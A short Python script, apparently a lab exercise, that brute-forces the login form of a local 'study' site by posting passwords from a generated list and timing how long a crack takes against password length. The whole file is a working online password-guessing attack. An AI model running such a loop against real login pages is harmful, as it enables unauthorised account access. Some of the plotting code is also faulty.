import requests
import password_generator as pg
import os.path
import time
import plot

url = 'http://study/actions.php?action=login'
login = 'brute_test'


class Plot:
    def __init__(self, x, y):
        self.x = x
        self.y = y

    def x(self):
        return self.x

    def y(self):
        return self.y


plot1 = Plot([], [])


def brute():
    if not os.path.exists('password_list.txt'):
        pg.generate()
    with open('password_list.txt', 'r') as pl:
        regenerate = input('Generate new password list? [y/n] ').lower()
        if regenerate == 'y':
            pg.generate()
        elif regenerate == 'n':
            pass
        login = input('Enter login: ')
        ask = input('Start brute? [y/n] ').lower()
        if ask == 'y':
            start_time = time.time()
            for line in pl.readlines():
                password = line.strip()
                with requests.Session() as s:
                    s.post(url=url, data={'login': login, 'password': password})
                    r = s.get('http://study/content.php?page=about')
                    if r.url == "http://study/content.php?page=about":
                        print(f'=======+ Good password: {password}')

                        time_to_crack = time.time() - start_time
                        plot1.x.append(pg.password_length())
                        plot1.y.append(time_to_crack)

                        print(f'Time: {time_to_crack}')
                        if "Выйти" in r.text:
                            print('Secret = Выйти')
                        break
                    else:
                        print(f"Bad password: {password}")


def create_plot(x_axis, y_axis):
    plot1 = plot.Plot(x_axis, y_axis)


if __name__ == "__main__":
    while True:
        brute()
        ask = input('Create plot? [y/n] ').lower()
        if ask == 'y':
            try:
                create_plot(plot1.x, plot1.y)
            except():
                print("Failed to create a plot")
        ask = input('Continue? [y/n] ').lower()
        if ask == 'n':
            break
